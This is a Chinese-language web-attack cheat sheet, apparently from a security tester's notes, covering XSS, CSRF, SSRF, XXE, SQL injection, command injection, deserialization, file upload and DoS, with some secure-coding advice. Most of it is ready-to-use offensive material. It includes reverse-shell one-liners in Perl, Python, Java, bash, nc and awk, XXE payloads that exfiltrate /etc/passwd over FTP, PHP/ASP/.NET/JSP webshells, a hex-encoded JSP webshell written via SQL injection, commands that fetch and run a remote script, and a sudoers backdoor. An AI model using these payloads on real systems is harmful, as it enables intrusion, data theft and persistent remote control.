# attack_pattern

## 特征

- BASE64：包含大小写字母数字+/，以%3D(==)结尾
- MD5：16字节128bit, 32个十六进制字符
- SHA1：20字节160bit, 40个十六进制字符，每个十六进制字符代表4bit，40x4=160bit
- SHA256: 32字节256bit, 64个十六进制字符


## XSS

1. 尝试使用`xss"><img src=x onerror=alert(3)>`

???+ tip
    使用 **AngularJS** 框架的应用, 检查页面元素, 属性中携带`class="ng-binding"`的即为绑定输出, 已经过输出编码, 不存在XSS.

### jQuery

> 如果使用`$('#id').text()`或`$('#id').val()`, 则不存在XSS.

???+ danger
    存在XSS的方法:

    - `$('#id').append()`
    - `$('#id').html()`
    - after
    - appendTo
    - before
    - insertAfter
    - insertBefore
    - prepend
    - prependTo
    - replaceAll
    - replaceWith
    - unwrap
    - wrap
    - wrapAll
    - wrapInner

```html hl_lines="11 14"
<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>
$(document).ready(function(){
  $("#textbtn").click(function(){
    $("#test1").text("<h1>Hello islibra world!</h1>");
  });
  $("#appendbtn").click(function(){
    $("#test1").append("<h1>Hello islibra world!</h1><script>alert('xss')<\/script>");
  });
  $("#htmlbtn").click(function(){
    $("#test2").html("<b>Hello world!</b>");
  });
  $("#valuebtn").click(function(){
    $("#test3").val("\"><h1>Dolly</h1> Duck");
  });
});
</script>
</head>
<body>

<p id="test1">This is a paragraph.</p>
<p id="test2">This is another paragraph.</p>

<p>Input field: <input type="text" id="test3" value="Mickey Mouse"></p>

<button id="textbtn">Set Text</button>
<button id="appendbtn">Append Text</button>
<button id="htmlbtn">Set HTML</button>
<button id="valuebtn">Set Value</button>

</body>
</html>
```


## CSRF

### 受害场景

1. 受害者已登录正常网站，{==SESSIONID==}存放在{==Cookies==}中
1. 受害者被诱骗用{==同一个浏览器==}打开非法网站, 如`http://127.0.0.1:8888/csrf.html?abc=1.1.1.1`
1. 非法网站存在访问正常网站请求脚本:

    ```html
    <form action="https://normal.request.action" method="POST" id="csrf_form">
        <input name="description" value="">
    </form>
    <script>
        var form = document.getElementById("csrf_form");
        form.submit();
    </script>
    ```

### 消减措施

#### 1. Referer

由浏览器添加

服务器校验:

```java
String referer = request.getHeader("Referer");
String hostname = request.getLocalName();
//TODO: compare
//Warning: 使用contains(), startWith()存在绕过
```

#### 2. token

1. 认证通过后, 在服务端生成随机数token, 存储在SESSION中, 并发送回客户端(设置Cookies)
1. 发送请求前, 从Cookies中获取token, 设置在 **请求头/请求体/URL** 中
1. 接受到请求, 对token进行校验

```java
String uri = request.getRequestURI();
//TODO: compare
//Warning: 使用contains(), startWith()存在绕过

String req_token = request.getHeader("csrf_token");
String token = (String)request.getSession().getAttribute("csrf_token");
if(token != null && token.equals(req_token)) {
    request.doFilter(request, response);
}
```

### 验证步骤

!!! info "只针对非GET请求"

1. 查看请求头/请求体/URL中是否存在 **token**, 如:
    - `roarand: xxx`

    删除/修改token
    1. 如果对token校验, 尝试 **绕过URL白名单**:
        - 跨越上层目录: `/logout/../xxx/xxx`

1. 如果没有token, 修改 **Referer**
    1. 如果对Referer校验, 尝试 **绕过** 使用contains(), startWith()进行的判断：
        - `http://eval.com?<originhost>`
        - `http://<originhost>@eval.com`
        - `http://<originhost>.eval.com`


## SSRF

> 所有场景都可攻击 **内网** 或 **本地**

1. 请求非http服务的端口
    - 返回banner信息，如：`http://scanme.nmap.org:22/test.txt`返回OpenSSH版本, `http://127.0.0.1:3306/test.txt`返回MySQL版本.
    - 探测端口开放状态, 如请求关闭的端口: `http://scanme.nmap.org:25/test.txt`报错.
1. 正则表达式攻击造成应用程序溢出
    - 如果`9876`端口开放, 构造`http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`使进程崩溃.
1. 通过访问默认文件, 识别应用
    - `http://10.0.0.1/portName.js`可以根据返回结果判断是否是 Dlink 路由器.
1. 访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.
    - `http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&methodIndex=17&{==arg0=http://our_public_internet_server/utils/cmd.war==}`
1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
1. 间接获取内置帐号token。


## XXE(XML External Entity attack)

!!! note "DTD: Document Type Definition, XML文件的模板, 定义XML文件中的元素, 元素的属性, 元素的排列方式, 元素包含的内容等"

### 验证步骤

1. 是否存在 **XML解析**
    - 存在Office2007及以上版本文件导入功能
    - SOAP接口, 如Apache CXF或axis实现的WebService接口

1. 是否存在漏洞
    - 检查poi-x.x.jar是否为3.10.1之前的版本

1. 本地启动 **http服务**: `python -m http.server 8888 --bind 192.168.1.1`
1. 使用WinRAR打开xlsx文件, 编辑[Content_Types].xml
    1. 是否支持解析内部实体(未报错)

        > 实体: 定义引用普通文本或特殊字符的快捷方式的变量

        ```xml hl_lines="3 5"
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <!DOCTYPE root [
            <!ENTITY test "testString">
        ]>
        <root>&test;</root>
        ```

    1. 是否支持解析外部实体

        ```xml hl_lines="3"
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <!DOCTYPE root [
        	<!ELEMENT test SYSTEM "http://192.168.1.1/test.dtd">
        ]>
        <root>&test;</root>
        ```

1. 导入xlsx文件后, 接收到 **http请求**
1. 另一种POC

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE root [
    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
    	%q;
    ]>
    <root></root>
    ```

1. http服务存放dtd文件

    ```dtd
    <!ENTITY % p1 SYSTEM "file:///etc/passwd">
    <!ENTITY % p2 "<!ENTITY &#x25; e1 SYSTEM 'ftp://192.168.1.1:21/%p1;'>">
    %p2;
    %e1;
    ```

    或

    ```xml
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <!DOCTYPE root [
    	<!ENTITY % q SYSTEM "http://10.21.151.32:8888/test.dtd">
    	%q;
    	%p;
    ]>
    <root>&exfil;</root>
    ```

    ```dtd
    <!ENTITY % data SYSTEM "file:///etc/passwd">
    <!ENTITY % p "<!ENTITY exfil SYSTEM 'ftp://10.21.151.32:21/%data;'>">
    ```

1. 使用IPOP开启 **ftp服务**, 导入xlsx文件, 接收到请求

    ``` hl_lines="9"
    ![2019/11/18 11:40:09] x.x.x.x:35914 connected
    < x.x.x.x USER anonymous
    > x.x.x.x 331 Password required for anonymous.
    < x.x.x.x PASS Java1.8.0_201@
    ! x.x.x.x User "anonymous" is authenticated
    > x.x.x.x 230 User anonymous logged in.
    < x.x.x.x TYPE I
    > x.x.x.x 200 Type set to I.
    < x.x.x.x CWD root:x:0:0:root:
    > x.x.x.x 501 CWD failed. Invalid directory name syntax
    < x.x.x.x QUIT
    > x.x.x.x 221 Goodbye.
    ![2019/11/18 11:40:09] x.x.x.x disconnected
    ```

1. 自定义FTPServer

    ```java
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.PrintWriter;
    import java.net.ServerSocket;
    import java.net.Socket;

    public class FtpServer {

        public static void main(String args[]) throws IOException {
            ServerSocket s = new ServerSocket(21);
            Socket incoming = s.accept();
            BufferedReader in = new BufferedReader(new InputStreamReader(incoming.getInputStream()));
            PrintWriter out = new PrintWriter(incoming.getOutputStream(), true);
            out.println("220 Ftp Server Running!");
            System.out.println(in.readLine());
            out.println("331 USER");
            System.out.println(in.readLine());
            out.println("230 Login In");
            while (true) {
                String str = in.readLine();
                if (str != null && str.trim().toUpperCase().startsWith("QUIT")) {
                    out.println("221 bye!");
                    out.close();
                    in.close();
                    break;
                } else if (str != null && str.trim().toUpperCase().startsWith("CWD")) {
                    System.out.print("\n" + str.substring(3));
                } else {
                    System.out.print(str);
                }
    			out.println("200 OK!");
            }
        }
    }
    ```


## 反序列化

```php
<?php
// 定义类
class Cl{
    var $test = "hello";
    var $age = 3;

    // magic函数会被自动调用
    // 命名是以符号开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup
    function __destruct(){
        // 序列化调用一次, 反序列化调用一次
        echo $this->test;
        // 注入点
        eval("$this->test");
    }
}
$c = new Cl();
// 序列化
$sc = serialize($c);
// object:类名长度:类名:属性数量:{s属性类型字符串:属性名称;s属性类型字符串:属性值;s属性类型字符串:属性名称;i属性类型整型:属性值}
// O:1:"C":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":1:{s:4:"test";s:5:"hello";}
// O:2:"Cl":2:{s:4:"test";s:5:"hello";s:3:"age";i:3;}
print_r($sc);
echo "<br>";
// 反序列化
$sc = 'O:2:"Cl":2:{s:4:"test";s:13:"system(\'id\');";s:3:"age";i:3;}';
// uid=1(daemon) gid=1(daemon) groups=1(daemon)
$uc = unserialize($sc);
// hello
print_r($uc->test);
?>
```

## SQL注入

### 注释

- 通用单行注释: `-- `, {==注意后面跟一个空格==}, 如`flag' or 1=1 -- `
- 通用多行注释: `/* ... */`
- MySQL单行注释: `#`, 如`flag' or 1=1 #`

### 常用POC

- 查询全部数据`flag' or 1=1 #`或`flag' or 1=1 -- `
- 猜解列数`flag' union select 1,2,3 #`, 返回的数据为1, 2, 3
- 猜解数据库名, 表名`flag' and exist(select * from xxx) #`或`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`, 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名
- 猜解列名, 数据类型`flag' and exist(select xxx from xxx) #`或`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#`
- 写入文件: `select "hackkkk" into outfile "/tmp/hackkkk.jsp";`
- 在文件开头写入内容:

    ```bash
    mysql> select "hackkkk" into outfile "/tmp/hackkk.jsp" LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e;
    Query OK, 1 row affected (0.02 sec)
    mysql> quit
    Bye
    $ cat /tmp/hackkk.jsp
    <?php phpinfo();?>hackkkk
    ```

- 将[jsp一句话木马](#_11)转换为十六进制`3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e`
- 先闭合原字符串, 再加`#`忽略后面语句, 中间添加POC: 使用`/**/`绕过空格校验, 在union的时候, 注意前后查询的参数个数相同

    ```
    zzz'/**/union/**/select+0x3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e+into+outfile+'/usr/local/tomcat/webapps/ucenter/kk.jsp'#
    ```

### 框架

#### JDBC

```java tab="错误的做法"
// 拼接SQL语句
String sql = "SELECT * FROM users WHERE name ='" + name + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

```java tab="推荐的做法"
// 使用占位符 ? 和预编译
String sql = "SELECT * FROM users WHERE name= ? ";
PreparedStatement ps = connection.prepareStatement(sql);
// 参数 index 从 1 开始
ps.setString(1, name);
```

???+ warning
    **order by** 不能使用参数绑定，需要通过白名单过滤。


#### MyBatis

##### XML

定义Mapper接口:

```java
@Mapper
public interface UserMapper {
    User getById(int id);
}
```

XML配置文件:

```xml
<select id="getById" resultType="org.example.User">
    SELECT * FROM user WHERE id = #{id}
</select>
```

##### Annotation

```java
@Mapper
public interface UserMapper {
    @Select("SELECT * FROM user WHERE id= #{id}")
    User getById(@Param("id") int id);
}
```

???+ danger "安全风险"
    - 使用`#{}`会自动生成`PreparedStatement`, 可有效防止SQL注入.
    - 而使用`${}`会直接注入原始字符串, 导致 {==SQL注入==}, 注意注入的 **参数类型要为字符串**!  
        ```xml
        <select id="getByName" resultType="org.example.User">
            SELECT * FROM user WHERE name = '${name}' limit 1
        </select>
        <!--当name的值为 ' or '1'='1 时, 相当于执行-->
        <!--SELECT * FROM user WHERE name = '' or '1'='1' limit 1-->
        ```

???+ warning
    - **order by** 使用`#{}`会被替换为字符串, 如`ORDER BY #{sortBy}`  ^sortBy=name^-->  `ORDER BY "name"`, 因此需要通过白名单过滤, 或使用if标签, 如:

        ```java tab="Java"
        List<User> getUserListSortBy(@Param("sortBy") String sortBy);
        ```

        ```xml tab="xml"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <if test="sortBy == 'name' or sortBy = 'email'">
                order by ${sortBy}
            </if>
        </select>
        ```

        ```xml tab="带默认值的情况"
        <select id="getUserListSortBy" resultMap="org.example.User">
            select * from user
            <choose>
                <when test="sortBy == 'name' or sortBy = 'email'">
                    order by ${sortBy}
                </when>
                <otherwise>
                    order by name
                </otherwise>
            </choose>
        </select>
        ```

    - **like** 需要使用通配符`%`和`_`
        - 方法一: 在Java中参数值两边拼接`%`, 再使用`#{}`
        - 方法二: 在xml中使用`bind`标签构造新参数, 再使用`#{}`

            ```java tab="Java"
            List<User> getUserListLike(@Param("name") String name);
            ```

            ```xml tab="xml"
            <select id="getUserListLike" resultType="org.example.User">
                <bind name="pattern" value="'%' + name + '%'" />
                    SELECT * FROM user WHERE name LIKE #{pattern}
            </select>
            ```

        - 方法三: 在xml中使用SQL语法`concat()`函数

            ```xml
            <select id="getUserListLikeConcat" resultType="org.example.User">
                SELECT * FROM user WHERE name LIKE concat ('%', #{name}, '%')
            </select>
            ```

    ???+ danger
        需要对用户输入进行过滤, 防止在大数据量情况下输入`{==%%==}`导致{==DOS==}。

    - **in**, 使用`<foreach>`和`#{}`

        ```java tab="Java"
        List<User> getUserListIn(@Param("nameList") List<String> nameList);
        ```

        ```xml tab="xml"
        <select id="selectUserIn" resultType="com.example.User">
            SELECT * FROM user WHERE name in
            <foreach item="name" collection="nameList" open="(" separator="," close=")">
                #{name}
            </foreach>
        </select>
        ```

    - **limit**, 使用`#{}`

        ```java tab="Java"
        List<User> getUserListLimit(@Param("offset") int offset, @Param("limit") int limit);
        ```

        ```xml tab="xml"
        <select id="getUserListLimit" resultType="org.example.User">
            SELECT * FROM user limit #{offset}, #{limit}
        </select>
        ```

#### JPA & Hibernate

略


???+ quote "参考链接"
    [彻底干掉恶心的 SQL 注入漏洞， 一网打尽！](https://mp.weixin.qq.com/s/hdOnO-tSGkQp0Wq3wcsIkw)


## 命令注入

### 验证步骤

1. 使用`;`, `|`或`&&`直接进行命令拼接
1. 使用`` USERID=`id -u` ``或`USERID=$(uname -a)`进行命令替换
1. 如果遇到特殊字符校验

    !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"

    1. `/`: 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
    1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
    1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行

1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
    1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
    1. 执行脚本: `xxx$(perl$IFS"/tmp/hhack.pl")`

1. 找到可以提权到root的脚本, 创建帐号, 设置密码, 添加权限
    ```sh
    useradd xxx;echo password | passwd xxx --stdin &>/dev/null;echo "xxx ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
    ```

### 反弹shell

reverse shell, 在控制端 **监听端口**, 被控端发起请求到该端口, 并将其命令行的输入输出转到控制端

#### 1. 在攻击端启动监听

```bash
$ ncat -lvp 53
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
```

#### 2. 在被控端发起连接

##### Perl

```bash
$ perl -e 'use Socket;$i="192.168.1.128";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# 或写进脚本执行
$ perl xxx.pl
```

##### Python

```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.128",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

##### Java

```java
public class Revs {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/53;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

##### bash

```bash
$ /bin/bash -i >& /dev/tcp/192.168.1.128/80 0>&1
```

##### nc

!!! danger "注意需要确认被控机器上已安装nc"

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 8080 >/tmp/f
```

##### awk

```bash
$ awk 'BEGIN{s="/inet/tcp/0/192.168.1.128/8080";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```


!!! quote "参考链接: [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)"


### 代码审计

#### Java

```java
import java.io.IOException;

public class OSi {
    public static void main(String args[])
    {
        System.out.println("Start");

        String cmd = "mkdir ddd;id>hack.txt";
        //String[] cmds = cmd.split(" ");
        try {
            // 关注cmd是否 {==完全可控==}
            // Runtime.getRuntime().exec(cmd);
            // 关注String[] {==第一个元素==} 是否可控或为 {==/bin/sh==}
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (IOException e) {
            System.out.println(e);
        }

        System.out.println("End");
    }
}
```

!!! success "如果传入String[]且第一个元素不是`/bin/sh`, 则不存在命令注入"

#### Python

调用`eval()`, 验证POC: `__import__(%27os%27).system(%27touch%20/tmp/hackkk.sh%27)`

##### 格式化字符串漏洞

!!! quote "[格式化字符串](../../coding/python/0x01_datatype/#_3)"

#### Go

!!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"

#### Perl

- system()

    ```perl
    # $username为用户输入
    $username = param ("username");
    # 使用$username拼接命令
    system ("cat /usr/stats/$username");
    # POC: xxx; cat /etc/passwd
    # 正常情况调用execvp()来运行“cat”, 如果包含Shell元字符, 则通过Shell来解释

    # 消减措施: 作为参数列表, 但是存在路径跨越如:../../etc/passwd
    system ("cat", "/usr/stats/$username");
    ```

- exec()


## OGNL注入


## 上传

### 验证步骤

1. 上传一句话木马webshell

    语言 | 代码
    --- | ---
    php | `<?php @eval($_POST['passwd']);?>`
    asp | `<%eval request(“passwd")%>`
    .net | `<%@ Page Language="Jscript"%><%eval(Request.Item["passwd"],"unsafe");%>`
    jsp | `<%if(request.getParameter("cmd")!=null){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>`

1. 如果前台校验了后缀名, 抓包修改后缀名
1. 在路径中添加`../`将webshell上传到可执行目录
1. 利用客户端连接工具如中国菜刀/蚁剑连接

## 下载

### 验证步骤

1. 文件名或路径可控, 在路径中添加`../`, 下载敏感文件如`/etc/passwd`
1. 如果文件路径在URL中, 需要进行URL编码`%2e%2e%2f`


## DoS

### zip

1. 使用root制作高压缩比文件：`dd if=/dev/zero count=$((1024*1024)) bs=4096 > big.csv`
1. 压缩：`zip -9 big.zip big.csv`

### 正则表达式

- 使用[REGEXPER](https://regexper.com/)解析，是否存在两层以上的循环。
- <https://jex.im/regulex/>

### json

!!! quote "参考: [Fastjson](../cve/cve_catalog/#fastjson_1)"
